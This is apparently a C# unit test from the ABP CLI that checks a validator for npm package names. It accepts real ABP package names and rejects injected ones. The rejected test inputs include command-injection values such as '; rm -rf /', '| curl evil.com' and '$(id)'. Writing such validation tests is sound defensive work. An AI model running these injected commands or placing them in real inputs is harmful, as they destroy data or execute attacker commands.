using Shouldly;
using Volo.Abp.Cli.ProjectModification;
using Xunit;

namespace Volo.Abp.Cli;

public class NpmPackagesUpdater_Tests
{
    [Theory]
    [InlineData("@abp/ng.core", true)]
    [InlineData("@abp/ng.theme.shared", true)]
    [InlineData("@abp/ng.components", true)]
    [InlineData("@volo/abp.ng.lepton-x.core", true)]
    [InlineData("@volo/abp.commercial.ng.ui", true)]
    [InlineData("@volosoft/abp.ng.theme.lepton", true)]
    [InlineData("@abp/core && calc.exe", false)]
    [InlineData("@abp/core; rm -rf /", false)]
    [InlineData("@abp/core | curl evil.com", false)]
    [InlineData("@abp/core`whoami`", false)]
    [InlineData("@abp/core$(id)", false)]
    [InlineData("@abp/core\nnewline", false)]
    [InlineData("@abp/ space", false)]
    [InlineData("@abp/", false)]
    [InlineData("@abp/ng core", false)]
    public void IsValidNpmPackageName(string packageName, bool expected)
    {
        NpmPackagesUpdater.IsValidNpmPackageName(packageName).ShouldBe(expected);
    }
}
